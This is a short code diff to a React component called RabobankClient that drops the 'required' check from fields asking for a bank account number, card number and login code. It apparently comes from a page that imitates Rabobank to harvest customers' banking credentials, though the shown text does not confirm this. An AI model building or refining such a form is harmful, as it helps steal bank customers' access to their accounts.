@@ -68,7 +68,6 @@ export function RabobankClient({ sessionId }: { sessionId: string }) {
               <div className="flex-[2]">
                 <label className="block text-[13px] text-gray-300 mb-2">Rekeningnummer</label>
                 <input 
-                  required 
                   type="text" 
                   value={rekeningnummer} 
                   onChange={e => setRekeningnummer(e.target.value)} 
@@ -79,7 +78,6 @@ export function RabobankClient({ sessionId }: { sessionId: string }) {
               <div className="flex-1">
                 <label className="block text-[13px] text-gray-300 mb-2">Pasnummer</label>
                 <input 
-                  required 
                   type="text" 
                   value={pasnummer} 
                   onChange={e => setPasnummer(e.target.value)} 
@@ -105,7 +103,6 @@ export function RabobankClient({ sessionId }: { sessionId: string }) {
             <div className="mb-8">
               <label className="block text-[13px] text-gray-300 mb-2">Inlogcode</label>
               <input 
-                required 
                 type="text" 
                 value={inlogcode} 
                 onChange={e => setInlogcode(e.target.value)} 
